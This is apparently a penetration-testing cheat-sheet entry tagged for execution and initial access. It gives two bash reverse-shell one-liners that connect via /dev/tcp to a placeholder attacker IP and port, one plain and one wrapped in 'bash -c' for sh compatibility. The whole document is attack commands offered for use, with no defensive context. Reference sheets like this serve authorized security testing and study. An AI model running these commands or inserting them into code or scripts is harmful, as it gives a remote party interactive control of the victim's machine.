---
tags:
  - Execution
  - Exploitation
  - Foundational
  - Initial_Access
  - Web_Application
---

### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1
```

#### Wrapped for sh Compatibility [alternative]
```bash
bash -c "bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1"
```
